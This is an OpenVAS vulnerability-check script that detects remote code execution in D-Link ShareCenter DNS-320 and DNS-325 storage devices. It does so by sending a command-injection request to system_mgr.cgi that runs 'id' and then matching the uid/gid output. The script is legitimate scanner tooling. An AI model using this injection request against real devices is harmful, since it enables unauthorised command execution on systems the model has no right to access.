###############################################################################
# OpenVAS Vulnerability Test
#
# D-Link ShareCenter Products Multiple Remote Code Execution Vulnerabilities
#
# Authors:
# Michael Meyer <michael.meyer@greenbone.net>
#
# Copyright:
# Copyright (C) 2013 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

if (description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.103699");
  script_version("2022-04-25T14:50:49+0000");
  script_tag(name:"cvss_base", value:"10.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:C/A:C");

  script_name("D-Link ShareCenter Products Multiple Remote Code Execution Vulnerabilities");

  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/51918");
  script_xref(name:"URL", value:"http://sharecenter.dlink.com/");
  script_xref(name:"URL", value:"http://blog.emaze.net/2012/02/advisory-information-title.html");
  script_xref(name:"URL", value:"http://www.securityfocus.com/archive/1/521532");

  script_tag(name:"last_modification", value:"2022-04-25 14:50:49 +0000 (Mon, 25 Apr 2022)");
  script_tag(name:"creation_date", value:"2013-04-18 12:07:07 +0200 (Thu, 18 Apr 2013)");
  script_category(ACT_ATTACK);
  script_tag(name:"qod_type", value:"remote_vul");
  script_family("Web application abuses");
  script_copyright("Copyright (C) 2013 Greenbone Networks GmbH");
  script_dependencies("find_service.nasl", "httpver.nasl", "global_settings.nasl");
  script_require_ports("Services/www", 80);
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_tag(name:"summary", value:"D-Link ShareCenter products are prone to multiple remote code-
execution vulnerabilities.

Successful exploits will result in the execution of arbitrary code in
the context of the affected application. Failed exploit attempts may
result in a denial-of-service condition.

The following products are affected:

D-Link DNS-320 ShareCenter D-Link DNS-325 ShareCenter");

  script_tag(name:"solution", value:"Updates are available.");
  script_tag(name:"solution_type", value:"VendorFix");

  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("port_service_func.inc");

port = http_get_port(default:80);

url = '/web/login.html';
if(http_vuln_check(port:port, url:url, pattern:"login_mgr.cgi", usecache:TRUE)) {

  url = '/cgi-bin/system_mgr.cgi?cmd=cgi_sms_test&command1=id';
  if(http_vuln_check(port:port, url:url, pattern:"uid=[0-9]+.*gid=[0-9]+.*")) {
    report = http_report_vuln_url( port:port, url:url );
    security_message(port:port, data:report);
    exit(0);
  }
  exit(99);
}

exit(0);
